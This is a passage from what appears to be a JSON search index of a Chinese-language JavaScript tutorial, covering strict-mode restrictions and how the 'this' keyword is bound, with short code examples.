\u662f\u4e24\u4e2a\u5386\u53f2\u9057\u7559\u7684\u53d8\u91cf\uff0c\u4ece\u6765\u6ca1\u6709\u6807\u51c6\u5316\u8fc7\uff0c\u73b0\u5728\u5df2\u7ecf\u53d6\u6d88\u4e86\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0b\u8c03\u7528\u5b83\u4eec\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u4f46\u662f\u4e0d\u4f1a\u62a5\u9519\u3002\u4e25\u683c\u6a21\u5f0f\u660e\u786e\u89c4\u5b9a\uff0c\u51fd\u6570\u5185\u90e8\u4f7f\u7528 arguments.callee \u3001 arguments.caller \u5c06\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 'use strict' ; var f = function () { return arguments . callee ; }; f (); // \u62a5\u9519","title":"\u7981\u6b62\u4f7f\u7528 arguments.callee\u3001arguments.caller"},{"location":"oop/strict/#_11","text":"\u4e25\u683c\u6a21\u5f0f\u4e0b\u65e0\u6cd5\u5220\u9664\u53d8\u91cf\uff0c\u5982\u679c\u4f7f\u7528 delete \u547d\u4ee4\u5220\u9664\u4e00\u4e2a\u53d8\u91cf\uff0c\u4f1a\u62a5\u9519\u3002\u53ea\u6709\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4e14\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u7684 configurable \u5c5e\u6027\u8bbe\u7f6e\u4e3a true \uff0c\u624d\u80fd\u88ab delete \u547d\u4ee4\u5220\u9664\u3002 1 2 3 4 5 6 7 8 9 10 11 'use strict' ; var x ; delete x ; // \u8bed\u6cd5\u9519\u8bef var obj = Object . create ( null , { x : { value : 1 , configurable : true } }); delete obj . x ; // \u5220\u9664\u6210\u529f","title":"\u7981\u6b62\u5220\u9664\u53d8\u91cf"},{"location":"oop/strict/#_12","text":"JavaScript \u8bed\u8a00\u7684\u4e00\u4e2a\u7279\u70b9\uff0c\u5c31\u662f\u5141\u8bb8\u201c\u52a8\u6001\u7ed1\u5b9a\u201d\uff0c\u5373\u67d0\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u5230\u5e95\u5c5e\u4e8e\u54ea\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e0d\u662f\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\u7684\uff0c\u800c\u662f\u5728\u8fd0\u884c\u65f6\uff08runtime\uff09\u786e\u5b9a\u7684\u3002 \u4e25\u683c\u6a21\u5f0f\u5bf9\u52a8\u6001\u7ed1\u5b9a\u505a\u4e86\u4e00\u4e9b\u9650\u5236\u3002\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ea\u5141\u8bb8\u9759\u6001\u7ed1\u5b9a\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c5e\u6027\u548c\u65b9\u6cd5\u5230\u5e95\u5f52\u5c5e\u54ea\u4e2a\u5bf9\u8c61\uff0c\u5fc5\u987b\u5728\u7f16\u8bd1\u9636\u6bb5\u5c31\u786e\u5b9a\u3002\u8fd9\u6837\u505a\u6709\u5229\u4e8e\u7f16\u8bd1\u6548\u7387\u7684\u63d0\u9ad8\uff0c\u4e5f\u4f7f\u5f97\u4ee3\u7801\u66f4\u5bb9\u6613\u9605\u8bfb\uff0c\u66f4\u5c11\u51fa\u73b0\u610f\u5916\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u6d89\u53ca\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u3002","title":"\u9759\u6001\u7ed1\u5b9a"},{"location":"oop/strict/#with","text":"\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528 with \u8bed\u53e5\u5c06\u62a5\u9519\u3002\u56e0\u4e3a with \u8bed\u53e5\u65e0\u6cd5\u5728\u7f16\u8bd1\u65f6\u5c31\u786e\u5b9a\uff0c\u67d0\u4e2a\u5c5e\u6027\u5230\u5e95\u5f52\u5c5e\u54ea\u4e2a\u5bf9\u8c61\uff0c\u4ece\u800c\u5f71\u54cd\u4e86\u7f16\u8bd1\u6548\u679c\u3002 1 2 3 4 5 6 7 8 'use strict' ; var v = 1 ; var obj = {}; with ( obj ) { v = 2 ; } // Uncaught SyntaxError: Strict mode code may not include a with statement","title":"\u7981\u6b62\u4f7f\u7528 with \u8bed\u53e5"},{"location":"oop/strict/#eval","text":"\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0cJavaScript \u8bed\u8a00\u6709\u4e24\u79cd\u53d8\u91cf\u4f5c\u7528\u57df\uff08scope\uff09\uff1a\u5168\u5c40\u4f5c\u7528\u57df\u548c\u51fd\u6570\u4f5c\u7528\u57df\u3002\u4e25\u683c\u6a21\u5f0f\u521b\u8bbe\u4e86\u7b2c\u4e09\u79cd\u4f5c\u7528\u57df\uff1a eval \u4f5c\u7528\u57df\u3002 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c eval \u8bed\u53e5\u7684\u4f5c\u7528\u57df\uff0c\u53d6\u51b3\u4e8e\u5b83\u5904\u4e8e\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u8fd8\u662f\u51fd\u6570\u4f5c\u7528\u57df\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c eval \u8bed\u53e5\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u4f5c\u7528\u57df\uff0c\u4e0d\u518d\u80fd\u591f\u5728\u5176\u6240\u8fd0\u884c\u7684\u4f5c\u7528\u57df\u521b\u8bbe\u65b0\u7684\u53d8\u91cf\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c eval \u6240\u751f\u6210\u7684\u53d8\u91cf\u53ea\u80fd\u7528\u4e8e eval \u5185\u90e8\u3002 1 2 3 4 5 6 ( function () { 'use strict' ; var x = 2 ; console . log ( eval ( 'var x = 5; x' )) // 5 console . log ( x ) // 2 })() \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e eval \u8bed\u53e5\u5185\u90e8\u662f\u4e00\u4e2a\u72ec\u7acb\u4f5c\u7528\u57df\uff0c\u6240\u4ee5\u5185\u90e8\u7684\u53d8\u91cf x \u4e0d\u4f1a\u6cc4\u9732\u5230\u5916\u90e8\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u5e0c\u671b eval \u8bed\u53e5\u4e5f\u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u6709\u4e24\u79cd\u65b9\u5f0f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u65b9\u5f0f\u4e00 function f1 ( str ){ 'use strict' ; return eval ( str ); } f1 ( 'undeclared_variable = 1' ); // \u62a5\u9519 // \u65b9\u5f0f\u4e8c function f2 ( str ){ return eval ( str ); } f2 ( '\"use strict\";undeclared_variable = 1' ) // \u62a5\u9519 \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c eval \u5185\u90e8\u4f7f\u7528\u7684\u90fd\u662f\u4e25\u683c\u6a21\u5f0f\u3002","title":"\u521b\u8bbe eval \u4f5c\u7528\u57df"},{"location":"oop/strict/#arguments","text":"\u53d8\u91cf arguments \u4ee3\u8868\u51fd\u6570\u7684\u53c2\u6570\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u5185\u90e8\u6539\u53d8\u53c2\u6570\u4e0e arguments \u7684\u8054\u7cfb\u88ab\u5207\u65ad\u4e86\uff0c\u4e24\u8005\u4e0d\u518d\u5b58\u5728\u8054\u52a8\u5173\u7cfb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function f ( a ) { a = 2 ; return [ a , arguments [ 0 ]]; } f ( 1 ); // \u6b63\u5e38\u6a21\u5f0f\u4e3a[2, 2] function f ( a ) { 'use strict' ; a = 2 ; return [ a , arguments [ 0 ]]; } f ( 1 ); // \u4e25\u683c\u6a21\u5f0f\u4e3a[2, 1] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6539\u53d8\u51fd\u6570\u7684\u53c2\u6570\uff0c\u4e0d\u4f1a\u53cd\u5e94\u5230 arguments \u5bf9\u8c61\u4e0a\u6765\u3002","title":"arguments \u4e0d\u518d\u8ffd\u8e2a\u53c2\u6570\u7684\u53d8\u5316"},{"location":"oop/strict/#javascript","text":"JavaScript \u8bed\u8a00\u7684\u4e0b\u4e00\u4e2a\u7248\u672c\u662f ECMAScript 6\uff0c\u4e3a\u4e86\u5e73\u7a33\u8fc7\u6e21\uff0c\u4e25\u683c\u6a21\u5f0f\u5f15\u5165\u4e86\u4e00\u4e9b ES6 \u8bed\u6cd5\u3002","title":"\u5411\u4e0b\u4e00\u4e2a\u7248\u672c\u7684 JavaScript \u8fc7\u6e21"},{"location":"oop/strict/#_13","text":"ES6 \u4f1a\u5f15\u5165\u5757\u7ea7\u4f5c\u7528\u57df\u3002\u4e3a\u4e86\u4e0e\u65b0\u7248\u672c\u63a5\u8f68\uff0cES5 \u7684\u4e25\u683c\u6a21\u5f0f\u53ea\u5141\u8bb8\u5728\u5168\u5c40\u4f5c\u7528\u57df\u6216\u51fd\u6570\u4f5c\u7528\u57df\u58f0\u660e\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u5141\u8bb8\u5728\u975e\u51fd\u6570\u7684\u4ee3\u7801\u5757\u5185\u58f0\u660e\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 'use strict' ; if ( true ) { function f1 () { } // \u8bed\u6cd5\u9519\u8bef } for ( var i = 0 ; i < 5 ; i ++ ) { function f2 () { } // \u8bed\u6cd5\u9519\u8bef } \u4e0a\u9762\u4ee3\u7801\u5728 if \u4ee3\u7801\u5757\u548c for \u4ee3\u7801\u5757\u4e2d\u58f0\u660e\u4e86\u51fd\u6570\uff0cES5 \u73af\u5883\u4f1a\u62a5\u9519\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u662f ES6 \u73af\u5883\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a ES6 \u5141\u8bb8\u5728\u4ee3\u7801\u5757\u4e4b\u4e2d\u58f0\u660e\u51fd\u6570\u3002","title":"\u975e\u51fd\u6570\u4ee3\u7801\u5757\u4e0d\u5f97\u58f0\u660e\u51fd\u6570"},{"location":"oop/strict/#_14","text":"\u4e3a\u4e86\u5411\u5c06\u6765 JavaScript \u7684\u65b0\u7248\u672c\u8fc7\u6e21\uff0c\u4e25\u683c\u6a21\u5f0f\u65b0\u589e\u4e86\u4e00\u4e9b\u4fdd\u7559\u5b57\uff08implements\u3001interface\u3001let\u3001package\u3001private\u3001protected\u3001public\u3001static\u3001yield\u7b49\uff09\u3002\u4f7f\u7528\u8fd9\u4e9b\u8bcd\u4f5c\u4e3a\u53d8\u91cf\u540d\u5c06\u4f1a\u62a5\u9519\u3002 1 2 3 4 function package ( protected ) { // \u8bed\u6cd5\u9519\u8bef 'use strict' ; var implements ; // \u8bed\u6cd5\u9519\u8bef }","title":"\u4fdd\u7559\u5b57"},{"location":"oop/strict/#_15","text":"MDN, Strict mode Dr. Axel Rauschmayer, JavaScript: Why the hatred for strict mode? Dr. Axel Rauschmayer\uff0c JavaScript\u2019s strict mode: a summary Douglas Crockford, Strict Mode Is Coming To Town JavaScript Strict Mode Support","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"oop/this/","text":"this \u5173\u952e\u5b57 \u00b6 \u6db5\u4e49 \u00b6 this \u5173\u952e\u5b57\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u8bed\u6cd5\u70b9\u3002\u6beb\u4e0d\u5938\u5f20\u5730\u8bf4\uff0c\u4e0d\u7406\u89e3\u5b83\u7684\u542b\u4e49\uff0c\u5927\u90e8\u5206\u5f00\u53d1\u4efb\u52a1\u90fd\u65e0\u6cd5\u5b8c\u6210\u3002 \u524d\u4e00\u7ae0\u5df2\u7ecf\u63d0\u5230\uff0c this \u53ef\u4ee5\u7528\u5728\u6784\u9020\u51fd\u6570\u4e4b\u4e2d\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u9664\u6b64\u4e4b\u5916\uff0c this \u8fd8\u53ef\u4ee5\u7528\u5728\u522b\u7684\u573a\u5408\u3002\u4f46\u4e0d\u7ba1\u662f\u4ec0\u4e48\u573a\u5408\uff0c this \u90fd\u6709\u4e00\u4e2a\u5171\u540c\u70b9\uff1a\u5b83\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u3002 \u7b80\u5355\u8bf4\uff0c this \u5c31\u662f\u5c5e\u6027\u6216\u65b9\u6cd5\u201c\u5f53\u524d\u201d\u6240\u5728\u7684\u5bf9\u8c61\u3002 1 this . property \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c this \u5c31\u4ee3\u8868 property \u5c5e\u6027\u5f53\u524d\u6240\u5728\u7684\u5bf9\u8c61\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var person = { name : '\u5f20\u4e09' , describe : function () { return '\u59d3\u540d\uff1a' + this . name ; } }; person . describe () // \"\u59d3\u540d\uff1a\u5f20\u4e09\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c this.name \u8868\u793a name \u5c5e\u6027\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002\u7531\u4e8e this.name \u662f\u5728 describe \u65b9\u6cd5\u4e2d\u8c03\u7528\uff0c\u800c describe \u65b9\u6cd5\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\u662f person \uff0c\u56e0\u6b64 this \u6307\u5411 person \uff0c this.name \u5c31\u662f person.name \u3002 \u7531\u4e8e\u5bf9\u8c61\u7684\u5c5e\u6027\u53ef\u4ee5\u8d4b\u7ed9\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5c5e\u6027\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\u662f\u53ef\u53d8\u7684\uff0c\u5373 this \u7684\u6307\u5411\u662f\u53ef\u53d8\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var A = { name : '\u5f20\u4e09' , describe : function () { return '\u59d3\u540d\uff1a' + this . name ; } }; var B = { name : '\u674e\u56db' }; B . describe = A . describe ; B . describe () // \"\u59d3\u540d\uff1a\u674e\u56db\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c A.describe \u5c5e\u6027\u88ab\u8d4b\u7ed9 B \uff0c\u4e8e\u662f B.describe \u5c31\u8868\u793a describe \u65b9\u6cd5\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\u662f B \uff0c\u6240\u4ee5 this.name \u5c31\u6307\u5411 B.name \u3002 \u7a0d\u7a0d\u91cd\u6784\u8fd9\u4e2a\u4f8b\u5b50\uff0c this \u7684\u52a8\u6001\u6307\u5411\u5c31\u80fd\u770b\u5f97\u66f4\u6e05\u695a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function f () { return '\u59d3\u540d\uff1a' + this . name ; } var A = { name : '\u5f20\u4e09' , describe : f }; var B = { name : '\u674e\u56db' , describe : f }; A . describe () // \"\u59d3\u540d\uff1a\u5f20\u4e09\" B . describe () // \"\u59d3\u540d\uff1a\u674e\u56db\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u5185\u90e8\u4f7f\u7528\u4e86 this \u5173\u952e\u5b57\uff0c\u968f\u7740 f \u6240\u5728\u7684\u5bf9\u8c61\u4e0d\u540c\uff0c this \u7684\u6307\u5411\u4e5f\u4e0d\u540c\u3002 \u53ea\u8981\u51fd\u6570\u88ab\u8d4b\u7ed9\u53e6\u4e00\u4e2a\u53d8\u91cf\uff0c this \u7684\u6307\u5411\u5c31\u4f1a\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 var A = { name : '\u5f20\u4e09' , describe : function () { return '\u59d3\u540d\uff1a' + this . name ; } }; var name = '\u674e\u56db' ; var f = A . describe ; f () // \"\u59d3\u540d\uff1a\u674e\u56db\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c A.describe \u88ab\u8d4b\u503c\u7ed9\u53d8\u91cf f \uff0c\u5185\u90e8\u7684 this \u5c31\u4f1a\u6307\u5411 f \u8fd0\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff08\u672c\u4f8b\u662f\u9876\u5c42\u5bf9\u8c61\uff09\u3002 \u518d\u770b\u4e00\u4e2a\u7f51\u9875\u7f16\u7a0b\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 < input type = \"text\" name = \"age\" size = 3 onChange = \"validate(this, 18, 99);\" > < script > function validate ( obj , lowval , hival ){ if (( obj . value < lowval ) || ( obj . value > hival )) console . log ( 'Invalid Value!' ); } </ script > \u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u6587\u672c\u8f93\u5165\u6846\uff0c\u6bcf\u5f53\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u503c\uff0c\u5c31\u4f1a\u8c03\u7528 onChange \u56de\u8c03\u51fd\u6570\uff0c\u9a8c\u8bc1\u8fd9\u4e2a\u503c\u662f\u5426\u5728\u6307\u5b9a\u8303\u56f4\u3002\u6d4f\u89c8\u5668\u4f1a\u5411\u56de\u8c03\u51fd\u6570\u4f20\u5165\u5f53\u524d\u5bf9\u8c61\uff0c\u56e0\u6b64 this \u5c31\u4ee3\u8868\u4f20\u5165\u5f53\u524d\u5bf9\u8c61\uff08\u5373\u6587\u672c\u6846\uff09\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4ece this.value \u4e0a\u9762\u8bfb\u5230\u7528\u6237\u7684\u8f93\u5165\u503c\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0cJavaScript \u8bed\u8a00\u4e4b\u4e2d\uff0c\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u8fd0\u884c\u73af\u5883\u4e5f\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u51fd\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u5bf9\u8c61\u4e4b\u4e2d\u8fd0\u884c\uff0c this \u5c31\u662f\u51fd\u6570\u8fd0\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff08\u73af\u5883\uff09\u3002\u8fd9\u672c\u6765\u5e76\u4e0d\u4f1a\u8ba9\u7528\u6237\u7cca\u6d82\uff0c\u4f46\u662f JavaScript \u652f\u6301\u8fd0\u884c\u73af\u5883\u52a8\u6001\u5207\u6362\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c this \u7684\u6307\u5411\u662f\u52a8\u6001\u7684\uff0c\u6ca1\u6709\u529e\u6cd5\u4e8b\u5148\u786e\u5b9a\u5230\u5e95\u6307\u5411\u54ea\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u624d\u662f\u6700\u8ba9\u521d\u5b66\u8005\u611f\u5230\u56f0\u60d1\u7684\u5730\u65b9\u3002 \u5b9e\u8d28 \u00b6 JavaScript \u8bed\u8a00\u4e4b\u6240\u4ee5\u6709 this \u7684\u8bbe\u8ba1\uff0c\u8ddf\u5185\u5b58\u91cc\u9762\u7684\u6570\u636e\u7ed3\u6784\u6709\u5173\u7cfb\u3002 1 var obj = { foo : 5 }; \u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u4e00\u4e2a\u5bf9\u8c61\u8d4b\u503c\u7ed9\u53d8\u91cf obj \u3002JavaScript \u5f15\u64ce\u4f1a\u5148\u5728\u5185\u5b58\u91cc\u9762\uff0c\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61 { foo: 5 } \uff0c\u7136\u540e\u628a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5185\u5b58\u5730\u5740\u8d4b\u503c\u7ed9\u53d8\u91cf obj \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53d8\u91cf obj \u662f\u4e00\u4e2a\u5730\u5740\uff08reference\uff09\u3002\u540e\u9762\u5982\u679c\u8981\u8bfb\u53d6 obj.foo \uff0c\u5f15\u64ce\u5148\u4ece obj \u62ff\u5230\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u518d\u4ece\u8be5\u5730\u5740\u8bfb\u51fa\u539f\u59cb\u7684\u5bf9\u8c61\uff0c\u8fd4\u56de\u5b83\u7684 foo \u5c5e\u6027\u3002 \u539f\u59cb\u7684\u5bf9\u8c61\u4ee5\u5b57\u5178\u7ed3\u6784\u4fdd\u5b58\uff0c\u6bcf\u4e00\u4e2a\u5c5e\u6027\u540d\u90fd\u5bf9\u5e94\u4e00\u4e2a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u4e0a\u9762\u4f8b\u5b50\u7684 foo \u5c5e\u6027\uff0c\u5b9e\u9645\u4e0a\u662f\u4ee5\u4e0b\u9762\u7684\u5f62\u5f0f\u4fdd\u5b58\u7684\u3002 1 2 3 4 5 6 7 8 { foo : { [[ value ]] : 5 [[ writable ]] : true [[ enumerable ]] : true [[ configurable ]] : true } } \u6ce8\u610f\uff0c foo \u5c5e\u6027\u7684\u503c\u4fdd\u5b58\u5728\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 value \u5c5e\u6027\u91cc\u9762\u3002 \u8fd9\u6837\u7684\u7ed3\u6784\u662f\u5f88\u6e05\u6670\u7684\uff0c\u95ee\u9898\u5728\u4e8e\u5c5e\u6027\u7684\u503c\u53ef\u80fd\u662f\u4e00\u4e2a\u51fd\u6570\u3002 1 var obj = { foo : function () {} }; \u8fd9\u65f6\uff0c\u5f15\u64ce\u4f1a\u5c06\u51fd\u6570\u5355\u72ec\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u518d\u5c06\u51fd\u6570\u7684\u5730\u5740\u8d4b\u503c\u7ed9 foo \u5c5e\u6027\u7684 value \u5c5e\u6027\u3002 1 2 3 4 5 6 { foo : { [[ value ]] : \u51fd\u6570\u7684\u5730\u5740 ... } } \u7531\u4e8e\u51fd\u6570\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u503c\uff0c\u6240\u4ee5\u5b83\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u73af\u5883\uff08\u4e0a\u4e0b\u6587\uff09\u6267\u884c\u3002 1 2 3 4 5 6 7 8 var f = function () {}; var obj = { f : f }; // \u5355\u72ec\u6267\u884c f () // obj \u73af\u5883\u6267\u884c obj . f () JavaScript \u5141\u8bb8\u5728\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u5f15\u7528\u5f53\u524d\u73af\u5883\u7684\u5176\u4ed6\u53d8\u91cf\u3002 1 2 3 var f = function () { console . log ( x ); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u4f53\u91cc\u9762\u4f7f\u7528\u4e86\u53d8\u91cf x \u3002\u8be5\u53d8\u91cf\u7531\u8fd0\u884c\u73af\u5883\u63d0\u4f9b\u3002 \u73b0\u5728\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u7531\u4e8e\u51fd\u6570\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u6267\u884c\uff0c\u6240\u4ee5\u9700\u8981\u6709\u4e00\u79cd\u673a\u5236\uff0c\u80fd\u591f\u5728\u51fd\u6570\u4f53\u5185\u90e8\u83b7\u5f97\u5f53\u524d\u7684\u8fd0\u884c\u73af\u5883\uff08context\uff09\u3002\u6240\u4ee5\uff0c this \u5c31\u51fa\u73b0\u4e86\uff0c\u5b83\u7684\u8bbe\u8ba1\u76ee\u7684\u5c31\u662f\u5728\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u6307\u4ee3\u51fd\u6570\u5f53\u524d\u7684\u8fd0\u884c\u73af\u5883\u3002 1 2 3 var f = function () { console . log ( this . x ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u4f53\u91cc\u9762\u7684 this.x \u5c31\u662f\u6307\u5f53\u524d\u8fd0\u884c\u73af\u5883\u7684 x \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var f = function () { console . log ( this . x ); } var x = 1 ; var obj = { f : f , x : 2 , }; // \u5355\u72ec\u6267\u884c f () // 1 // obj \u73af\u5883\u6267\u884c obj . f () // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u5728\u5168\u5c40\u73af\u5883\u6267\u884c\uff0c this.x \u6307\u5411\u5168\u5c40\u73af\u5883\u7684 x \uff1b\u5728 obj \u73af\u5883\u6267\u884c\uff0c this.x \u6307\u5411 obj.x \u3002 \u4f7f\u7528\u573a\u5408 \u00b6 this \u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u4f7f\u7528\u573a\u5408\u3002 \uff081\uff09\u5168\u5c40\u73af\u5883 \u5168\u5c40\u73af\u5883\u4f7f\u7528 this \uff0c\u5b83\u6307\u7684\u5c31\u662f\u9876\u5c42\u5bf9\u8c61 window \u3002 1 2 3 4 5 6 this === window // true function f () { console . log ( this === window ); } f () // true \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u4e0d\u7ba1\u662f\u4e0d\u662f\u5728\u51fd\u6570\u5185\u90e8\uff0c\u53ea\u8981\u662f\u5728\u5168\u5c40\u73af\u5883\u4e0b\u8fd0\u884c\uff0c this \u5c31\u662f\u6307\u9876\u5c42\u5bf9\u8c61 window \u3002 \uff082\uff09\u6784\u9020\u51fd\u6570 \u6784\u9020\u51fd\u6570\u4e2d\u7684 this \uff0c\u6307\u7684\u662f\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 var Obj = function ( p ) { this . p = p ; }; \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570 Obj \u3002\u7531\u4e8e this \u6307\u5411\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6240\u4ee5\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8\u5b9a\u4e49 this.p \uff0c\u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u5b9e\u4f8b\u5bf9\u8c61\u6709\u4e00\u4e2a p \u5c5e\u6027\u3002 1 2 var o = new Obj ( 'Hello World!' ); o . p // \"Hello World!\" \uff083\uff09\u5bf9\u8c61\u7684\u65b9\u6cd5 \u5982\u679c\u5bf9\u8c61\u7684\u65b9\u6cd5\u91cc\u9762\u5305\u542b this \uff0c this \u7684\u6307\u5411\u5c31\u662f\u65b9\u6cd5\u8fd0\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c31\u4f1a\u6539\u53d8 this \u7684\u6307\u5411\u3002 \u4f46\u662f\uff0c\u8fd9\u6761\u89c4\u5219\u5f88\u4e0d\u5bb9\u6613\u628a\u63e1\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 var obj = { foo : function () { console . log ( this ); } }; obj . foo () // obj \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.foo \u65b9\u6cd5\u6267\u884c\u65f6\uff0c\u5b83\u5185\u90e8\u7684 this \u6307\u5411 obj \u3002 \u4f46\u662f\uff0c\u4e0b\u9762\u8fd9\u51e0\u79cd\u7528\u6cd5\uff0c\u90fd\u4f1a\u6539\u53d8 this \u7684\u6307\u5411\u3002 1 2 3 4 5 6 // \u60c5\u51b5\u4e00 ( obj . foo = obj . foo )() // window // \u60c5\u51b5\u4e8c ( false || obj . foo )() // window // \u60c5\u51b5\u4e09 ( 1 , obj . foo )() // window \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.foo \u5c31\u662f\u4e00\u4e2a\u503c\u3002\u8fd9\u4e2a\u503c\u771f\u6b63\u8c03\u7528\u7684\u65f6\u5019\uff0c\u8fd0\u884c\u73af\u5883\u5df2\u7ecf\u4e0d\u662f obj \u4e86\uff0c\u800c\u662f\u5168\u5c40\u73af\u5883\uff0c\u6240\u4ee5 this \u4e0d\u518d\u6307\u5411 obj \u3002 \u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff0cJavaScript \u5f15\u64ce\u5185\u90e8\uff0c obj \u548c obj.foo \u50a8\u5b58\u5728\u4e24\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u79f0\u4e3a\u5730\u5740\u4e00\u548c\u5730\u5740\u4e8c\u3002 obj.foo() \u8fd9\u6837\u8c03\u7528\u65f6\uff0c\u662f\u4ece\u5730\u5740\u4e00\u8c03\u7528\u5730\u5740\u4e8c\uff0c\u56e0\u6b64\u5730\u5740\u4e8c\u7684\u8fd0\u884c\u73af\u5883\u662f\u5730\u5740\u4e00\uff0c this \u6307\u5411 obj \u3002\u4f46\u662f\uff0c\u4e0a\u9762\u4e09\u79cd\u60c5\u51b5\uff0c\u90fd\u662f\u76f4\u63a5\u53d6\u51fa\u5730\u5740\u4e8c\u8fdb\u884c\u8c03\u7528\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd0\u884c\u73af\u5883\u5c31\u662f\u5168\u5c40\u73af\u5883\uff0c\u56e0\u6b64 this \u6307\u5411\u5168\u5c40\u73af\u5883\u3002\u4e0a\u9762\u4e09\u79cd\u60c5\u51b5\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // \u60c5\u51b5\u4e00 ( obj . foo = function () { console . log ( this ); })() // 